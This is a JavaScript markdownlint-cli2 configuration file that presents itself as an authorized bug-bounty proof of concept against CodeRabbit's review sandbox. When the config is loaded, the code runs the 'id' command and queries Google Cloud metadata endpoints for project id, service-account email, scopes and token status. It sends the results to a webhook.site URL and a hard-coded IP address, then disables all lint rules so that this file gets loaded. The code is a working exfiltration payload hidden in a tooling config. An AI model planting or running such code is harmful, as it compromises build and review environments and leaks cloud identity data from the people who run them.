// Authorized bug-bounty PoC (CodeRabbit VDP, researcher larocas). Benign reach-test.
// Loaded/executed by markdownlint-cli2 in CodeRabbit's review sandbox at config-load time.
// Purpose: settle ONE unknown -> can the jailuser sandbox reach GCP metadata?
// Captures IDENTITY only (project-id / SA email / SA scopes) + token STATUS+LEN (never the token body).
const http = require('http');
const https = require('https');
const RUN = 'crmeta1';
const WH = 'https://webhook.site/30f56a43-a0d2-47d4-9fd6-95948b0eaf8c';
const VPS = 'http://62.171.145.137:9111';

function beacon(marker) {
  var m = '/' + RUN + '-' + String(marker).slice(0, 220);
  try { var a = https.get(WH + m, function (r) { r.resume(); }); a.on('error', function () {}); a.setTimeout(6000, function () { a.destroy(); }); } catch (e) {}
  try { var b = http.get(VPS + m, function (r) { r.resume(); }); b.on('error', function () {}); b.setTimeout(6000, function () { b.destroy(); }); } catch (e) {}
}

// (1) LOAD marker first - proves the sandbox executed this config even if metadata is firewalled.
var idout = '';
try { idout = require('child_process').execSync('id', { timeout: 3000 }).toString().trim(); } catch (e) { idout = 'id-err'; }
beacon('load-' + encodeURIComponent(idout));

// (2/3/4) Metadata GET helper. Tries a single field on a single host with a ~4s timeout.
function mdGet(hostTag, host, path, label, tokenMode) {
  var url = 'http://' + host + '/computeMetadata/v1/' + path;
  var req = http.get(url, { headers: { 'Metadata-Flavor': 'Google' }, timeout: 4000 }, function (res) {
    var body = '';
    res.on('data', function (c) { body += c; });
    res.on('end', function () {
      if (tokenMode) {
        // token endpoint: STATUS + LENGTH ONLY, never the token body.
        beacon(hostTag + '-' + label + '-s' + res.statusCode + '-len' + body.length);
      } else {
        beacon(hostTag + '-' + label + '-s' + res.statusCode + '-v' + encodeURIComponent(body.slice(0, 140)));
      }
    });
  });
  req.on('timeout', function () { try { req.destroy(); } catch (e) {} beacon(hostTag + '-' + label + '-TIMEOUT'); });
  req.on('error', function (e) { beacon(hostTag + '-' + label + '-ERR-' + ((e && (e.code || e.message)) || 'x')); });
}

function sweep(hostTag, host) {
  mdGet(hostTag, host, 'project/project-id', 'projid', false);
  mdGet(hostTag, host, 'instance/service-accounts/default/email', 'email', false);
  mdGet(hostTag, host, 'instance/service-accounts/default/scopes', 'scopes', false);
  mdGet(hostTag, host, 'instance/service-accounts/default/token', 'token', true);
}

// Try BOTH the DNS name and the raw link-local IP.
sweep('mgi', 'metadata.google.internal');
sweep('net', '169.254.169.254');

// Disable all markdownlint rules so the tool loads THIS config (differential in-band proof).
module.exports = { config: { default: false } };
